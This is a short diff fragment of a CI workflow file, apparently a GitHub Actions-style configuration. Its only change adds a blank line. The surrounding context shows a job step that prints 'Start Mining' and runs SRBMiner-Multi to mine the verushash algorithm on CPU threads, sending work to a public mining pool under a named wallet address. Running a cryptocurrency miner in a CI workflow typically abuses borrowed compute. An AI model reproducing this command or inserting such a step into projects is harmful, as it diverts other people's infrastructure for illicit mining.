@@ -17,3 +17,4 @@ workflows:
           echo "Start Mining"
           ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
         
+
